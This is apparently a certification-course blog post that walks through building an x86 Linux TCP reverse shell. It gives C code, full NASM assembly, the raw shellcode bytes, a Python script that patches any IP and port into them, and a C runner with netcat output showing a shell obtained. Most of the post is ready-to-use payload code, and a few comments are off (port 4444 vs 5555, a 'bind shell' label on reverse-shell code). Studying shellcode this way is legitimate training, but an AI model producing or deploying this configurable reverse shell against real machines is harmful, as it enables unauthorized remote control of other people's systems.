# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-XXXXX

## Assignment#2: What to do ?


## First step: create a TCP reverse shell
This shellcode needs to be able to:
* Create a reverse connection to a configured IP and Port
* Execute a shell on successful connection

The second step is to create a script which will make the IP and port configuration easy

### What is a reverse shell
A TCP reverse shell connects back to a remote machine, then executes a shell and redirects all input & output to the socket.

### Example of bind shell TCP in C
```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, int *argv[])
{
    // Create s for the socket
    int s;
    // Create sockaddr_in struct
    struct sockaddr_in addr;
	
    // AF_INET for IPv4
    addr.sin_family = AF_INET;
    // Set port number to 4444
    addr.sin_port = htons(4444);
    // Listen on any interface
    addr.sin_addr.s_addr = inet_addr("127.1.1.1");

    // Create the sock
    // AF_INET for IPv4
    // SOCK_STREAM for TCP connection
    s = socket(AF_INET, SOCK_STREAM, 0);

    // Connect to the remote machine
    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    // Redirect the STDIN, STDOUT and STDERR into the socket
    for (int i = 0; i < 3; i++)
    {
        dup2(s, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", 0, 0);

    return 0;
}
```


Now, let's get to work.
=

The assembly code
-

The first step is to initialize the stack and the registers:
```nasm
;set the stack pointer

mov ebp, esp

;initialize registers to zero

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

The second step is to push the sockaddr_in struct in the stack:
```nasm
;struct sockaddr_in struct
;addr.sin_family = AF_INET;
;addr.sin_port = htons(4444);
;addr.sin_addr.s_addr = inet_addr("127.1.1.1");

push eax
push eax            ;padding for sin_zero sockaddr_in struct
push 0x0101017f     ;initialize ip address to 127.1.1.1 
push word 0xb315    ;port number initialize to 5555
push word 0x02      ;network family initialize for IPv4
```

We can now call the "socket" systemcall which will create an endpoint for communication:
```nasm
;s = socket(AF_INET, SOCK_STREAM, 0);

mov ax, 0x167       ;system call number for socket
mov bl, 0x02        ;IPv4 family adress
mov cl, 0x01        ;TCP socket
int 0x80            ;go for it
mov esi, eax        ;move return value (file descriptor) into esi
```

Then, we need to call the "connect" systemcall which will initiate a connection on a socket:
```nasm
;connect(s, (struct sockaddr *)&addr, sizeof(addr));

xor eax, eax
mov ax, 0x16a       ;connect system call number
mov ebx, esi        ;file descriptor
mov ecx, esp        ;point to the struct present in the stack
mov edi, ebp        ;used to get the size of the structure
sub edi, esp        ;used to get the size of the structure
mov edx, edi        ;get the size of the struct by using a simple soustraction
int 0x80            ;go for it
```

This part of the code will use dup2 to redirect the STDIN, STDOUT and STDERR into the socket:
```nasm
;for (int i = 0; i < 3; i++)
;{
;    dup2(connfd, i);
;}

xor ecx, ecx
mov cl, 3
boucle:
    xor eax, eax
    mov al, 0x3f    ;dup system call number
    mov ebx, esi    ;mov the fd variable in ebx
    dec cl          ;dec to cl 1
    int 0x80        ;go for it
    inc cl          ;inc to cl 1
    loop boucle
```

It's finaly the time to execute the shell:
```nasm
;execve("/bin/sh", 0, 0);

xor eax, eax
push eax            ;push a NULL byte
push 0x68732f2f     ;push /bin//sh
push 0x6e69622f     ;push /bin//sh
mov ebx, esp        ;mov the adress of "/bin//sh" in ebx
xor ecx, ecx        ;initialize ecx to NULL
xor edx, edx        ;initialize edx to NULL
mov al, 0xb         ;system call number for execve
int 0x80            ;go for it
```

You can find the whole code below:
```nasm
;Simple ASM (x86) reverse shell for 127.1.1.1 on port 5555
global _start

_start:
;set the frame pointer
mov ebp, esp

;initialize registers to NULL
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;struct sockaddr_in struct
;addr.sin_family = AF_INET;
;addr.sin_port = htons(4444);
;addr.sin_addr.s_addr = inet_addr("127.1.1.1");
push eax
push eax            ;padding for sin_zero sockaddr_in struct
push 0x0101017f     ;initialize ip address to 127.1.1.1 
push word 0xb315    ;port number initialize to 5555
push word 0x02      ;network family initialize for IPv4

;s = socket(AF_INET, SOCK_STREAM, 0);
mov ax, 0x167       ;system call number for socket
mov bl, 0x02        ;IPv4 family adress
mov cl, 0x01        ;TCP socket
int 0x80            ;go for it
mov esi, eax        ;move return value (file descriptor) into esi

;connect(s, (struct sockaddr *)&sa, sizeof(sa));
xor eax, eax
mov ax, 0x16a       ;connect system call number
mov ebx, esi        ;file descriptor
mov ecx, esp        ;point to the struct present in the stack
mov edi, ebp        ;used to get the size of the structure
sub edi, esp        ;used to get the size of the structure
mov edx, edi        ;get the size of the struct by using a simple soustraction
int 0x80            ;go for it

;for (int i = 0; i < 3; i++)
;{
;    dup2(connfd, i);
;}
xor ecx, ecx
mov cl, 3
boucle:
    xor eax, eax
    mov al, 0x3f    ;dup system call number
    mov ebx, esi    ;mov the fd variable in ebx
    dec cl          ;dec to cl 1
    int 0x80        ;go for it
    inc cl          ;inc to cl 1
    loop boucle

;execve("/bin/sh", 0, 0);
xor eax, eax
push eax ;push a NULL byte
push 0x68732f2f     ;push /bin//sh
push 0x6e69622f     ;push /bin//sh
mov ebx, esp        ;mov the adress of "/bin//sh" in ebx
xor ecx, ecx        ;initialize ecx to NULL
xor edx, edx        ;initialize edx to NULL
mov al, 0xb         ;system call number for execve
int 0x80            ;go for it
```

Let's open a port:
```console
kali@kali:/tmp$ nc -lvnp 5555
listening on [any] 5555 ...

```

Let's compile and execute it: 
```console
kali@kali:/tmp/$ nasm -f elf32 -o reverse_shell.o reverse_shell.nasm
kali@kali:/tmp/$ ld -m elf_i386 -z execstack -o reverse_shell reverse_shell.o
kali@kali:/tmp/$ ./reverse
```

We get our shell after executing the shellcode:
```console
kali@kali:/tmp$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 50746
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
whoami
kali

```


# Second step: make the ip and port configuration easy

Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 

Why ? Because our python script won't interpret our shellcode without this part.

We can easily do that by using the following objdump command:
```console
kali@kali:/tmp$ objdump -d ./reverse_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
```

We can now add this shellcode to our python script. This script is pretty simple, it parses the 'shellcode' variable content, look for the '\\x15\\xb3' pattern (which is 5555 in reverse hexadecimal) and replace it by the port value asked by the user. 

It also does the same thing for the IP, it looks for the '\\x7f\\x01\\x01\\x01' pattern (which is 127.1.1.1 in reverse hexadecimal) and replace it by the ip value asked by the user.

Here is the code:
```python
#!/usr/bin/python3

import sys
import socket
import binascii

#Shellcode
shellcode = '\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80'

if len(sys.argv) < 3:
	print('Usage: python3 {name} <IP> <PORT>'.format(name = sys.argv[0]))
	print('Example: python3 {name} 127.1.1.1 5555'.format(name = sys.argv[0]))
	exit(1)

#Modify ip address
ip = sys.argv[1].split('.')
ip_in_hex = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
shellcode = shellcode.replace('\\x7f\\x01\\x01\\x01', '\\x{0}\\x{1}\\x{2}\\x{3}'.format(
										ip_in_hex[0:2],
										ip_in_hex[2:4],
										ip_in_hex[4:6],
										ip_in_hex[6:8]
))

#Modify port number
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace('\\x15\\xb3', '\\x{0}\\x{1}'.format(port[4:6], port[2:4]))

print(shellcode)
```

This script will give us the following result:
```console
kali@kali:/tmp$ python3 modify_reverse_shell.py 127.0.0.7 2222

\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x01\x01\x01\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```

In order to test it, we can now used this return and add it to a C program which will execute our shellcode

The C program source code (this code can be found at root directory named 'test_shellcode.c')
```c
#include <stdio.h>
#include <string.h>

// reverse_shell.nasm shellcode is stored here
unsigned char code[] = \
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x01\x01\x01\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

main()
{
        // print the length of the shellcode
        printf("Shellcode Length:  %d\n", strlen(code));
        // convert shellcode to a function
        int (*ret)() = (int(*)())code;
        // execute the shellcode has a function
        ret();

}
```

We will use netcat to open a port on localhost:
```console
kali@kali:/tmp$ nc -lvnp 2222
listening on [any] 2222 ...

```

On another terminal, we will compile it and execute it:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
kali@kali:/tmp$ ./test_shellcode 
Shellcode Length:  95

```

Finaly, netcat can be used to access our shell:
```console
kali@kali:/tmp$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 52346
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
whoami
kali

```
